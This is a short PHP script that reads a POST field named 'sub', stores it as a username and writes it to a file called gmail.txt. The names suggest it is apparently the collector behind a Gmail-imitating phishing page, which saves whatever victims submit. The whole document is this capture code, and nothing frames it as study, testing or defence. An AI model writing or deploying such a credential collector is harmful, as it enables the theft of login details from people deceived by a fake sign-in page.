<?php
$username = $_POST['sub'];
$f = fopen('gmail.txt','w');
fwrite($f,$username);
?>